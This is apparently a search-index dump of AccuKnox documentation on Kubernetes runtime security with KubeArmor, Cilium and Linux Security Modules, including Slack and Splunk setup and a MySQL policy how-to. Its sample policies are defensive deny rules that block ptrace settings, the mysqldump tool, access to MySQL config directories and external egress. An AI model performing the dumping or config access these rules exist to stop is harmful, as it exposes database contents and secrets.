framework provides \u201cAudit\u201d functionality which KubeArmor leverages of. They also give alternative ways of generating log files. However, LSMs do not have any container-related information; thus, they create alerts and system logs only based on system metadata (e.g., User ID, Group ID, and process ID). Therefore, it is hard to figure out what containers cause policy violations. To overcome this, KubeArmor uses an eBPF-based system monitor, which keeps track of process life cycles in containers and even nodes, and converts system metadata to container/node identities when LSMs generate alerts and system logs for any policy violations from containers and nodes (VMs). (High-level overview of KubeArmor & LSM integration) LSM framework also supports the creation of pseudo-filesystems \u2013 to easily interact with the security modules from the user space \u2013 Loading and editing some access rules, reading some audit data, or modifying the module's configurations. To enforce security policies at runtime, KubeArmor maintains these policies separately, i.e., security policies are no longer tightly coupled with containers. Then, KubeArmor directly applies the security policies to Linux security modules (LSMs) for each container according to the labels of given containers and security policies. Similarly, KubeArmor enforces security policies on nodes (VMs) too. What\u2019s Next? \u00b6 Kubearmor uses AppArmor and, more recently, added support to SELinux for enforcement. \u201c BPF-LSM \u201d (also referred to as KRSI ) support is on the newest future roadmap for KubeArmor. Today the kernel events generated by LSM are resolved at the container level in KubeArmor. E.g., when a process spawns, we know the context from which container it has spawned. But to make the security policy enforcement more robust in the future, we are planning to store the security policies instead in the eBPF map and then link them to container ids, i.e., container-id -> {resource-map} The *resource-ma*p might look something like this: { type [file,process,socket,...], type-related-info, /* process/file/socket details */ fromSource, /*parent process info - optional */ Action, /* action audit/deny */ } Hence, when the LSM hook is called, there shall be a lookup into this map to check if there is a resource match and invoke the action. This would optimize LSM\u2019s calling path and we should see a performance improvement in KubeArmor.","title":"Lsm and kubearmor"},{"location":"getting-started/lsm-and-kubearmor/#overview-of-lsm-framework","text":"( https://www.ibm.com/developerworks/library/l-selinux/ ) The LSM framework allows third-party access control mechanisms to be linked into the kernel and modify the default DAC implementation. Hence, KubeArmor connects with Linux security modules (LSMs) so that it can work on top of any Linux platforms (such as Alpine, Ubuntu, and Container-optimized OS from Google) if Linux security modules (e.g., AppArmor , SELinux , or KRSI ) are enabled in the Linux Kernel. Since only a single LSM can be used at a time, they all assumed they had exclusive access to the security context pointers and security identifiers embedded in protected kernel objects; KubeArmor automatically chooses the appropriate LSMs to enforce its required policies. By default, the LSM framework does not provide security but only the infrastructure to support the security modules. It also provides functions to register and un-register security modules.","title":"Overview of LSM Framework:"},{"location":"getting-started/lsm-and-kubearmor/#lsm-security-data-fields","text":"The LSM framework enables security modules to associate security information with kernel objects. It extends \u201csensitive data types\u201d with opaque data security fields (The security fields are simply void * pointers added in various kernel data structures.) \u2022 For process and program, security field added to \u2013 struct task_struct and struct linux_binrpm \u2022 For the File system, the security field added to \u2013 struct super_block \u2022 For pipe, file, and socket, security field added to \u2013 struct inode and struct file \u2022 For packet and network devices, security field added to \u2013 struct sk_buff and struct net_device \u2022 For System V IPC, security field added to \u2013 struct kern_ipc_perm and struct msg_msg","title":"LSM Security Data fields"},{"location":"getting-started/lsm-and-kubearmor/#other-lsm-features","text":"Aside from these hooks and the actions they permit, the LSM framework provides \u201cAudit\u201d functionality which KubeArmor leverages of. They also give alternative ways of generating log files. However, LSMs do not have any container-related information; thus, they create alerts and system logs only based on system metadata (e.g., User ID, Group ID, and process ID). Therefore, it is hard to figure out what containers cause policy violations. To overcome this, KubeArmor uses an eBPF-based system monitor, which keeps track of process life cycles in containers and even nodes, and converts system metadata to container/node identities when LSMs generate alerts and system logs for any policy violations from containers and nodes (VMs). (High-level overview of KubeArmor & LSM integration) LSM framework also supports the creation of pseudo-filesystems \u2013 to easily interact with the security modules from the user space \u2013 Loading and editing some access rules, reading some audit data, or modifying the module's configurations. To enforce security policies at runtime, KubeArmor maintains these policies separately, i.e., security policies are no longer tightly coupled with containers. Then, KubeArmor directly applies the security policies to Linux security modules (LSMs) for each container according to the labels of given containers and security policies. Similarly, KubeArmor enforces security policies on nodes (VMs) too.","title":"Other LSM features"},{"location":"getting-started/lsm-and-kubearmor/#whats-next","text":"Kubearmor uses AppArmor and, more recently, added support to SELinux for enforcement. \u201c BPF-LSM \u201d (also referred to as KRSI ) support is on the newest future roadmap for KubeArmor. Today the kernel events generated by LSM are resolved at the container level in KubeArmor. E.g., when a process spawns, we know the context from which container it has spawned. But to make the security policy enforcement more robust in the future, we are planning to store the security policies instead in the eBPF map and then link them to container ids, i.e., container-id -> {resource-map} The *resource-ma*p might look something like this: { type [file,process,socket,...], type-related-info, /* process/file/socket details */ fromSource, /*parent process info - optional */ Action, /* action audit/deny */ } Hence, when the LSM hook is called, there shall be a lookup into this map to check if there is a resource match and invoke the action. This would optimize LSM\u2019s calling path and we should see a performance improvement in KubeArmor.","title":"What\u2019s Next?"},{"location":"getting-started/open-source-vs-enterprise/","text":"Accuknox offers a suite of fully open source tools (CNCF projects, apache license) as well as an enterprise SAAS suite. Open source features include \u00b6 Network security using Cilium Application hardening and protection using KubeArmor Auto policy discovery tool Policy templates Enterprise features include \u00b6 all of the open source feature + Policy recommendations based on workload types Deep learning based anomaly detection for Kubernetes workloads Full gitops workflow integration Multi-tenant, multi-cluster managemnt solution Integrations with AWS Cloudwatch, JIRA, Splunk Enterprise (app), JIRA, ELK, and more.","title":"Open source vs Enterprise"},{"location":"getting-started/open-source-vs-enterprise/#open-source-features-include","text":"Network security using Cilium Application hardening and protection using KubeArmor Auto policy discovery tool Policy templates","title":"Open source features include"},{"location":"getting-started/open-source-vs-enterprise/#enterprise-features-include","text":"all of the open source feature + Policy recommendations based on workload types Deep learning based anomaly detection for Kubernetes workloads Full gitops workflow integration Multi-tenant, multi-cluster managemnt solution Integrations with AWS Cloudwatch, JIRA, Splunk Enterprise (app), JIRA, ELK, and more.","title":"Enterprise features include"},{"location":"getting-started/policy-discovery/","text":"Developers can discover policies using the policy discovery tool which leads to a detailed policy (per pod in the case of kubernetes) to be generated with the following information: Developers or DevSecOps can enable policy discovery during the development phase, or during a dev environment depening upon how the security posture of the organization is set. Since all policy is generated as code, it can be version controlled and can be introduced in a standard CI/CD pipeline enabling incremental improvements. Developers or SecOps team can chose to have Policy discovery running so that newer policies are continued to be generated as the application continues to run. Accuknox provides runtime Kubernetes security using the following underlying technologies: Linux security modules - AppArmor and SELinux to harden application workloads and restrict the workload from accessing or exhibiting behavior that was not allowed as a part of a security policy. eBPF - Accuknox additionally uses eBPF to both monitor application level system calls to provide runtime observability as well as provide L3, L4 and L7 security. Accuknox provides the following runtime security \u00b6","title":"Policy discovery"},{"location":"getting-started/policy-discovery/#accuknox-provides-the-following-runtime-security","text":"","title":"Accuknox provides the following runtime security"},{"location":"getting-started/security-policy-as-code/","text":"Accknox enables DevSecOps teams to embed security policies as code into their GitOps workflow. This provides a unified, collaborative view of the policies and enables them to be shipped and deployed along with the applications they are protecting. So instead of needing to separately configure perimeter or host firewall rules, AccuKnox leverages Kubernetes to apply them at the pod and host level as deployments change. AccuKnox uses Cilium and KubeArmor to enforce policies for Network and Application security at runtime. Both tools use either Yaml or JSON files as their policy definition language to apply rules for runtime security. Sample Application Policy \u00b6 Below is a sample KubeArmor policy that blocks access to the ptrace process: apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-mitre-ptrace-syscall spec : tags : [ \"MITRE\" , \"T1055.008\" , \"Privilege Escalation\" , \"P-trace\" ] message : \"Alert! ptrace access denied\" nodeSelector : matchLabels : kubernetes.io/hostname : gke-ubuntu # Change your match labels file : severity : 6 matchPaths : - path : /proc/sys/kernel/yama/ptrace_scope - path : /etc/sysctl.d/10-ptrace.conf action : Block Sample Network Policy \u00b6 Below is a sample Cilium poloicy that denies access to helm tiller endpoint: apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"cnp-ingress-mitre-t1210-block-helm-tiller-endpoint\" spec : description : \"Policy to Deny Access to tiller endpoint on port 44134\" endpointSelector : matchLabels : app : test #change app: test to match your label ingressDeny : - toPorts : - ports : - port : \"44134\" protocol : ANY Note, KubeArmor provides numerous open source policy templates to help you get started with monitoring and enforcing compliance and security. To learn more about policy templates: Visit the GitHub policy template repository Examples include CIS, NIST, PCI and support, several different languages and application examples.","title":"Policy using GitOps Workflow"},{"location":"getting-started/security-policy-as-code/#sample-application-policy","text":"Below is a sample KubeArmor policy that blocks access to the ptrace process: apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-mitre-ptrace-syscall spec : tags : [ \"MITRE\" , \"T1055.008\" , \"Privilege Escalation\" , \"P-trace\" ] message : \"Alert! ptrace access denied\" nodeSelector : matchLabels : kubernetes.io/hostname : gke-ubuntu # Change your match labels file : severity : 6 matchPaths : - path : /proc/sys/kernel/yama/ptrace_scope - path : /etc/sysctl.d/10-ptrace.conf action : Block","title":"Sample Application Policy"},{"location":"getting-started/security-policy-as-code/#sample-network-policy","text":"Below is a sample Cilium poloicy that denies access to helm tiller endpoint: apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"cnp-ingress-mitre-t1210-block-helm-tiller-endpoint\" spec : description : \"Policy to Deny Access to tiller endpoint on port 44134\" endpointSelector : matchLabels : app : test #change app: test to match your label ingressDeny : - toPorts : - ports : - port : \"44134\" protocol : ANY Note, KubeArmor provides numerous open source policy templates to help you get started with monitoring and enforcing compliance and security. To learn more about policy templates: Visit the GitHub policy template repository Examples include CIS, NIST, PCI and support, several different languages and application examples.","title":"Sample Network Policy"},{"location":"getting-started/slack-integration/","text":"Slack Integration \u00b6 To send an alert notification via Slack you must first set up the Slack notification Channel . Integration of Slack: \u00b6 a. Prerequisites: \u00b6 You need a valid and active account in Slack. After logging into your Slack channel, you must generate a Hook URL. Note : To generate Hook URL follow the steps, Webhooks-for-Slack . b. Steps to Integrate: \u00b6 Go to Channel Integration. Click integrate now on Slack. Fill up the following fields: Integration Name: Enter the name for the integration. You can set any name. e.g., Container Security Alerts Hook URL: Enter your generated slack hook URL here. e.g., https://hooks.slack.com/services/T000/B000/XXXXXXX Sender Name: Enter the sender name here. e.g., AccuKnox User Channel Name: Enter your slack channel name here. e.g., livealertsforcontainer Click Test to check the new functionality, You will receive the test message on configured slack channel. - Test message Please ignore !! Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.","title":"Slack"},{"location":"getting-started/slack-integration/#slack-integration","text":"To send an alert notification via Slack you must first set up the Slack notification Channel .","title":"Slack Integration"},{"location":"getting-started/slack-integration/#integration-of-slack","text":"","title":"Integration of Slack:"},{"location":"getting-started/slack-integration/#a-prerequisites","text":"You need a valid and active account in Slack. After logging into your Slack channel, you must generate a Hook URL. Note : To generate Hook URL follow the steps, Webhooks-for-Slack .","title":"a. Prerequisites:"},{"location":"getting-started/slack-integration/#b-steps-to-integrate","text":"Go to Channel Integration. Click integrate now on Slack. Fill up the following fields: Integration Name: Enter the name for the integration. You can set any name. e.g., Container Security Alerts Hook URL: Enter your generated slack hook URL here. e.g., https://hooks.slack.com/services/T000/B000/XXXXXXX Sender Name: Enter the sender name here. e.g., AccuKnox User Channel Name: Enter your slack channel name here. e.g., livealertsforcontainer Click Test to check the new functionality, You will receive the test message on configured slack channel. - Test message Please ignore !! Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.","title":"b. Steps to Integrate:"},{"location":"getting-started/splunk-integration/","text":"Splunk Integration \u00b6 Splunk is a software platform to search, analyze, and visualize machine-generated data gathered from websites, applications, sensors, and devices. AccuKnox integrates with Splunk and monitors your assets and sends alerts for resource misconfigurations, compliance violations, network security risks, and anomalous user activities to Splunk. To forward the events from your workspace you must have Splunk Depolyed and HEC URL generated first for Splunk Integration . Integration of Splunk: \u00b6 a. Prerequisites: \u00b6 Set up Splunk HTTP Event Collector (HEC) to view alert notifications from AccuKnox in Splunk. Splunk HEC lets you send data and application events to a Splunk deployment over the HTTP and Secure HTTP (HTTPS) protocols. To set up HEC , use instructions in Splunk documentation . For source type,_json is the default; if you specify a custom string on AccuKnox, that value will overwrite anything you set here. Select Settings > Data inputs > HTTP Event Collector and make sure you see HEC added in the list and that the status shows that it is Enabled . b. Steps to Integrate: \u00b6 Go to Channel Integration . Click integrate now on Splunk. Enter the following details to configure Splunk. Select the Splunk App : From the dropdown, Select Splunk Enterprise. Integration Name: Enter the name for the integration. You can set any name. e.g., Test Splunk Splunk HTTP event collector URL: Enter your Splunk HEC URL generated earlier.e.g., https://splunk-xxxxxxxxxx.com/services/collector Index: Enter your Splunk Index, once created while creating HEC. e.g., main Token: Enter your Splunk Token, generated while creating HEC URL. e.g., x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000 Source: Enter the source as http:kafka Source Type: Enter your Source Type here, this can be anything and the same will be attach to the event type forwarded to splunk. e.g., _json Click Test to check the new functionality, You will receive the test message on configured slack channel. e.g., Test Message host = xxxxxx-deployment-xxxxxx-xxx00 source = http:kafka sourcetype = trials Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.","title":"Splunk"},{"location":"getting-started/splunk-integration/#splunk-integration","text":"Splunk is a software platform to search, analyze, and visualize machine-generated data gathered from websites, applications, sensors, and devices. AccuKnox integrates with Splunk and monitors your assets and sends alerts for resource misconfigurations, compliance violations, network security risks, and anomalous user activities to Splunk. To forward the events from your workspace you must have Splunk Depolyed and HEC URL generated first for Splunk Integration .","title":"Splunk Integration"},{"location":"getting-started/splunk-integration/#integration-of-splunk","text":"","title":"Integration of Splunk:"},{"location":"getting-started/splunk-integration/#a-prerequisites","text":"Set up Splunk HTTP Event Collector (HEC) to view alert notifications from AccuKnox in Splunk. Splunk HEC lets you send data and application events to a Splunk deployment over the HTTP and Secure HTTP (HTTPS) protocols. To set up HEC , use instructions in Splunk documentation . For source type,_json is the default; if you specify a custom string on AccuKnox, that value will overwrite anything you set here. Select Settings > Data inputs > HTTP Event Collector and make sure you see HEC added in the list and that the status shows that it is Enabled .","title":"a. Prerequisites:"},{"location":"getting-started/splunk-integration/#b-steps-to-integrate","text":"Go to Channel Integration . Click integrate now on Splunk. Enter the following details to configure Splunk. Select the Splunk App : From the dropdown, Select Splunk Enterprise. Integration Name: Enter the name for the integration. You can set any name. e.g., Test Splunk Splunk HTTP event collector URL: Enter your Splunk HEC URL generated earlier.e.g., https://splunk-xxxxxxxxxx.com/services/collector Index: Enter your Splunk Index, once created while creating HEC. e.g., main Token: Enter your Splunk Token, generated while creating HEC URL. e.g., x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000 Source: Enter the source as http:kafka Source Type: Enter your Source Type here, this can be anything and the same will be attach to the event type forwarded to splunk. e.g., _json Click Test to check the new functionality, You will receive the test message on configured slack channel. e.g., Test Message host = xxxxxx-deployment-xxxxxx-xxx00 source = http:kafka sourcetype = trials Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.","title":"b. Steps to Integrate:"},{"location":"getting-started/technology/","text":"Accuknox offers runtime protection for your Kubernetes and other cloud workloads is provided using Kernel Native Primitives such as eBPF for Networking (L3, L4 and L7 security) and observability Linux Security Modules (LSM) - Accuknox uses AppArmor and SELinux both are active Linux Security Modules for application hardening and security at runtime. Both eBPF and Linux Security Modules (LSMS) are well known approaches to hardening / protecting workloads running in Linux. KubeArmor \u00b6 KubeArmor is an open source application hardening and runtime security solution for Cloud Native workloads. https://github.com/accuknox/KubeArmor KubeArmor uses Linux Security Modules (LSMs \u2013 AppArmor or SELinux to enforce application security), Syscall Filtering and soon eBPF LSMs to support hardening of a given process or container while interacting with the host, resources or other processes locally or across the network. Additionally, KubeArmor produces alert logs for policy violations that happen in containers by monitoring the operations of containers\u2019 processes using its eBPF-based system monitor. KubeArmor allows operators to define security policies based on Kubernetes metadata and simply apply them into Kubernetes. Additionally KubeArmor supports virtual machine and baremetal workloads at this moment of time. Cilium CNI \u00b6 Cilium is an open source project to provide networking, security, and observability for cloud native environments such as Kubernetes clusters and other container orchestration platforms [1]. Cilium uses eBPF which is a Linux kernel technology that allows dynamic inserts of a program (called eBPF program) to be safely executed into Linux kernel. Cilium operates as a CNI (\u200b\u200bContainer Networking Interface) running in each node of the cluster. Auto Policy Discovery \u00b6 The auto policy discovery is a fully open source component that can fully automatically discover the security profile of your application by observing it in a given environment.","title":"AppArmor, SELinux and eBPF"},{"location":"getting-started/technology/#kubearmor","text":"KubeArmor is an open source application hardening and runtime security solution for Cloud Native workloads. https://github.com/accuknox/KubeArmor KubeArmor uses Linux Security Modules (LSMs \u2013 AppArmor or SELinux to enforce application security), Syscall Filtering and soon eBPF LSMs to support hardening of a given process or container while interacting with the host, resources or other processes locally or across the network. Additionally, KubeArmor produces alert logs for policy violations that happen in containers by monitoring the operations of containers\u2019 processes using its eBPF-based system monitor. KubeArmor allows operators to define security policies based on Kubernetes metadata and simply apply them into Kubernetes. Additionally KubeArmor supports virtual machine and baremetal workloads at this moment of time.","title":"KubeArmor"},{"location":"getting-started/technology/#cilium-cni","text":"Cilium is an open source project to provide networking, security, and observability for cloud native environments such as Kubernetes clusters and other container orchestration platforms [1]. Cilium uses eBPF which is a Linux kernel technology that allows dynamic inserts of a program (called eBPF program) to be safely executed into Linux kernel. Cilium operates as a CNI (\u200b\u200bContainer Networking Interface) running in each node of the cluster.","title":"Cilium CNI"},{"location":"getting-started/technology/#auto-policy-discovery","text":"The auto policy discovery is a fully open source component that can fully automatically discover the security profile of your application by observing it in a given environment.","title":"Auto Policy Discovery"},{"location":"getting-started/vm-baremetal/","text":"Accuknox cloud security tools also supports virtual machine and baremetal workloads with the help of KVMservice. Accuknox can enforce virtual machine and baremetal policies security seamlessly and effortlessly with the following features: discovery of virtual machines / baremetals with the agent installation discovery of processes within the virtual machines automatically discover policies for individual processes or for the entire host. Accuknox components including VM specific components are deployed as a part of a VM cluster as daemons, on all nodes where enforcement must happen.","title":"VM / Baremetal Workloads"},{"location":"getting-started/vm-onboarding/","text":"This document is in progress and will be updated soon.","title":"Vm onboarding"},{"location":"getting-started/what-is-runtime-security/","text":"Runtime security is the protection of workloads against active threats and malicious behavior once the workloads have been initialized and are running. Accuknox provides framework and tools for Runtime Security for Kubernetes, Containerised and VM/Bare-Metal based workloads. In the case of a Kubernetes pods, runtime is the state that when the pod has come to a running state - this happens after image scanning of the containers, after the patching has been done, after admission controller has allowed for the deployment of the pods. When the pod has actually begun to run and interact with its host operating system requesting for resources and communicating via the network is when it can be defined as it currently running. And any security solution that monitors and continously protects the workloads in a runtime state is called a runtime security solution. To understand what is runtime security and what we do, lets look at the following illustration: When a workload is running, it communicates through its library (java, golang, python..) to the kernel. These calls get converted to syscalls . These syscall events when filtered in the order of relevance can be categorized broadly into the following (not an existive) type of features: Application interaction with the OS and other processes including - workloads forking process, establishing new network connections and accessing files. Network connections can be further categorized into L3, L4 and L7 connections. Request for specific capabilities A runtime security solution is able to provide full visibility into all of these application interactions with the host kernel and provide the ability to filter or restrict specific actions at runtime. With Accuknox you can automatically discover the application interaction and network interaction in the form of policy as code subsequently these policies can be audited or enforced at runtime giving you the ability to restrict specific behaviors of the application. For example you could have a policy that says Pod A cannot access /etc/bin folder Pod B cannot initiate ptrace i.e. trace the execution of other processes Pod C cannot communicate to a remote TCP server running on port 5000. This list can be as exhaustive as you like, and these policies are enforced within the kernel using kernel primitives and technologies as listed below: Application security using KubeArmor \u00b6 The Linux Security Module (LSM) framework provides a mechanism for various security checks to be hooked by new kernel extensions. It denies access to essential kernel objects, such as files, inodes, task structures, credentials, and inter-process communication objects. AccuKnox supports AppArmor, SELinux and BPF-LSM as of today for its enforcement engine at runtime. Network Security using Cilium \u00b6 Network runtime protection in the form of L3, L4 and L7 rules using identity (x509 certificates or K8s labels) for your K8s workloads. In K8s policies this is implemented as a CNI using Cilium. For Virtual Machine workloads, labels are used to provide host level network policies for L3, L4 and L7.","title":"Defining runtime security"},{"location":"getting-started/what-is-runtime-security/#application-security-using-kubearmor","text":"The Linux Security Module (LSM) framework provides a mechanism for various security checks to be hooked by new kernel extensions. It denies access to essential kernel objects, such as files, inodes, task structures, credentials, and inter-process communication objects. AccuKnox supports AppArmor, SELinux and BPF-LSM as of today for its enforcement engine at runtime.","title":"Application security using KubeArmor"},{"location":"getting-started/what-is-runtime-security/#network-security-using-cilium","text":"Network runtime protection in the form of L3, L4 and L7 rules using identity (x509 certificates or K8s labels) for your K8s workloads. In K8s policies this is implemented as a CNI using Cilium. For Virtual Machine workloads, labels are used to provide host level network policies for L3, L4 and L7.","title":"Network Security using Cilium"},{"location":"getting-started/what-is-the-problem-accuknox-solves/","text":"What is the problem that Accuknox solves? \u00b6 Modern Kubernetes and other cloud applications include: Dozens of open source libraries, all of which come with inherent supply chain risks; Example a recent study found that more than half the docker images had some vulnerability. It is not entirely common but sometimes unpatched vulnerabilities, or misconfigurations slip through in production Zero-day attacks that create chaos as workloads can be compromised until a patch has been applied.. In such a scenario, applications can be compromised and once they are, they can initiate a wide range of malicious activity even if not running as a root. Accuknox provides runtime security for your Kubernetes workloads to prevent malicious activity as determined by MITRE and other indicators of compromise and stops your workload from behaving maliciously at runtime. This gives you the necessary guardrails to restrict application behavior within a set of predefined policies while you apply a patch. Unlike traditional solutions that recommend a full quarantine of the workloads, accuknox's runtime solution can provide you active runtime protection allowing you to only restrict the malicious behavior as opposed to the entire workload.","title":"What is the problem that Accuknox solves?"},{"location":"getting-started/what-is-the-problem-accuknox-solves/#what-is-the-problem-that-accuknox-solves","text":"Modern Kubernetes and other cloud applications include: Dozens of open source libraries, all of which come with inherent supply chain risks; Example a recent study found that more than half the docker images had some vulnerability. It is not entirely common but sometimes unpatched vulnerabilities, or misconfigurations slip through in production Zero-day attacks that create chaos as workloads can be compromised until a patch has been applied.. In such a scenario, applications can be compromised and once they are, they can initiate a wide range of malicious activity even if not running as a root. Accuknox provides runtime security for your Kubernetes workloads to prevent malicious activity as determined by MITRE and other indicators of compromise and stops your workload from behaving maliciously at runtime. This gives you the necessary guardrails to restrict application behavior within a set of predefined policies while you apply a patch. Unlike traditional solutions that recommend a full quarantine of the workloads, accuknox's runtime solution can provide you active runtime protection allowing you to only restrict the malicious behavior as opposed to the entire workload.","title":"What is the problem that Accuknox solves?"},{"location":"getting-started/workspace-manager/","text":"Workspace Manager in AccuKnox \u00b6 The workspace manager allows enterprise users to manage their multi-tenant clusters, user and user onboarding, onboard new clusters and manage enterprise integrations. With workspace manager one can, Manage Users and their onboarding Enable / Disable or create granular Role-Based Access Controls (RBAC) Onboard New Clusters Configure Channel Integrations","title":"Workspace manager"},{"location":"getting-started/workspace-manager/#workspace-manager-in-accuknox","text":"The workspace manager allows enterprise users to manage their multi-tenant clusters, user and user onboarding, onboard new clusters and manage enterprise integrations. With workspace manager one can, Manage Users and their onboarding Enable / Disable or create granular Role-Based Access Controls (RBAC) Onboard New Clusters Configure Channel Integrations","title":"Workspace Manager in AccuKnox"},{"location":"how-to/ensure-policies-will-not-break-application/","text":"How to ensure enforcing policies will not break my application? \u00b6 Introduction \u00b6 When we using KubeArmor and Cilium policies to allow the functionality of particular functions in deployment. These policies should not obstruct the deployment process and our application should work as intended without any disturbance with applied policies. AccuKnox provides fine-grained access control for workloads at runtime allowing DevSecOps to control what resources, files, networks, and processes a workload can access. With AccuKnox the DevSecOps can create runtime policies to make sure always verify and never trust that's how zero trust model can be created. AccuKnox allows SecOps to restrict the following types of behavior on the cloud workloads. File access - A typical file access by a process or a network can be allowed or denied on specific paths - Process execution - The ability to allow or deny a Process execution or forking can be achieved for specific processes or all the processes on a directory - Network connection - It is easy to allow or deny any network-based communication from a workload using AccuKnox. The requests can be TCP, UDP, or even ICMP packets can be denied or allowed. - Capabilities - A workload can share the capabilities of the host if and when allowed. Such capabilities can enable additional types of malicious behavior. With AccuKnox we can allow or deny workloads to request other capabilities with the host OS. For example,An online book-store app made with MySQL as a database. Scenerio is we want to keep the logs from being exposed to the public and also allowing them to function. We need to develop regulations that merely block the exposure, not the entire functionality. We'll go over how to construct rules with suitable permissions and use cases in this document. Sample Application Deployment \u00b6 AccuKnox sample library has various deployments for your needs to deploy vulnerable applications and use cases and Proof-of-concept, etc., Check out here . AccuKnox maintains repository that contains various sample deployment that one can use to play with for various PoC scenarios. In this use case we are going to deploy an Online Book Store app made with mysql deployment. To create this mysql deployment into your cluster run this below command: kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/OnlineBookStore/mysql-deployment.yaml Output: service/mysql created deployment.apps/mysql created persistentvolume/mysql-pv-volume created persistentvolumeclaim/mysql-pv-claim created Deployment state: NAME READY STATUS RESTARTS AGE pod/mysql-68579b78bb-rttvt 1 /1 Running 0 24s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE service/kubernetes ClusterIP 10 .44.0.1 <none> 443 /TCP 3h3m service/mysql ClusterIP None <none> 3306 /TCP 27s NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/mysql 1 /1 1 1 26s NAME DESIRED CURRENT READY AGE replicaset.apps/mysql-68579b78bb 1 1 1 26s Policy-Templates \u00b6 AccuKnox policy-templates includes ready-made policy templates for all of our needs, from NIST, PCI-DSS, and STIG compliances to all CVEs and everything in between. That is the repository we will use in our use case. Check out policy-template for further information. Policy Creation \u00b6 To apply this KubeArmor Policy run this below command: [Note: matchLabels and namespace may vary check with your deployment] In this policy we are going to audit the config files for any unusual activity. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml Policy YAML: # KubeArmor is an open source software that enables you to protect your cloud workload at run-time. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-restrict-access-mysql-server-config namespace : default # Change your namespace spec : tags : [ \"MYSQL\" , \"config-files\" , \"mysqldump\" ] message : \"Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\" selector : matchLabels : app : mysql8 # Change your labels file : severity : 5 matchPaths : - path : /etc/mysql/my.cnf ownerOnly : true matchDirectories : - dir : /etc/mysql/ recursive : true ownerOnly : true - dir : /var/lib/mysql/ readOnly : true recursive : true - dir : /var/log/mysql/ recursive : true action : Audit process : severity : 10 matchPaths : - path : /usr/bin/mysqldump action : Block In our policy we have mentioned the: - dir : /var/lib/mysql/ readOnly : true recursive : true readOnly: true this rule will give appropriate permissions to the deployed application. \\ So we can stop the logs from exposing and also our policy won\u2019t break the applications functionality. In this policy we are going to protect the mysqldump to get accessed and to apply this policy run this command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/system/ksp-block-mysql-dump-in-pods.yaml Policy YAML: # KubeArmor is an open source software that enables you to protect your cloud workload at run-time. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: ksp-block-mysql-dump-in-pods namespace: default # Change your namespace spec: tags: [ \"mysql\" , \"system\" , \"K8s\" ] message: \"Warning! MySQLdump is blocked\" selector: matchLabels: app: testpod #change with your own label process: matchPaths: - path: /usr/bin/mysqldump action: Block severity: 6 In this policy we are protecting the configuration files from exposure. To apply the policy run this below command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/system/ksp-block-stigs-mysql-config-directory-access.yaml Policy YAML: # KubeArmor is an open source software that enables you to protect your cloud workload at run-time. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: ksp-block-stigs-mysql-config-directory-access namespace: default # Change your namespace spec: tags: [ \"STIGS\" , \"MYSQL\" ] message: \"Alert! Access to mysql conf files has been denied\" selector: matchLabels: pod: mysql-1 # Change your match labels file: severity: 5 matchDirectories: - dir: /etc/mysql/ recursive: true ownerOnly: true - dir: /usr/lib/mysql/ recursive: true ownerOnly: true - dir: /usr/share/mysql/ recursive: true ownerOnly: true - dir: /var/lib/mysql/ recursive: true ownerOnly: true - dir: /var/log/mysql/ recursive: true ownerOnly: true - dir: /usr/local/mysql/ recursive: true ownerOnly: true action: Block In this Cilium policy we are going to protect the unused ports from accessing the workloads. To apply the policy run this below command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/network/cnp-mysql-stig-v-235146.yaml Policy YAML: # https://www.stigviewer.com/stig/oracle_mysql_8.0/2021-12-10/finding/V-235146 apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : cnp-mysql-stig-v-235146 namespace : default #change default namespace to match your namespace spec : description : \"Restrict access to unused ports\" endpointSelector : matchLabels : app : mysql #change label app: mysql with your own labels. ingress : - fromEndpoints : - {} toPorts : - ports : - port : \"3306\" - ports : - port : \"33060\" In this cilium policy we are protecting from external access to our mysql workload. To apply the policy run the below command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/network/cnp-egress-deny-external-communication-from-mysql-pod.yaml Policy YAML: apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : cnp-egress-deny-external-communication-from-mysql-pod namespace : default #change default namespace to match your namespace spec : description : \"To block all external world communication from mysql pod and limit it to specific pods\" endpointSelector : matchLabels : app : mysql #change app: mysql to match your label egressDeny : - toEntities : - \"world\" egress : - toEndpoints : - matchLabels : app : frontend #change app: frontend to match your label Verification: After applying multiple policies from policy-template our deployment is still running and without any issues \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml kubearmorpolicy.security.kubearmor.com/ksp-restrict-access-mysql-server-config unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/system/ksp-block-mysql-dump-in-pods.yaml kubearmorpolicy.security.kubearmor.com/ksp-block-mysql-dump-in-pods unchanged \u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/system/ksp-block-stigs-mysql-config-directory-access.yaml 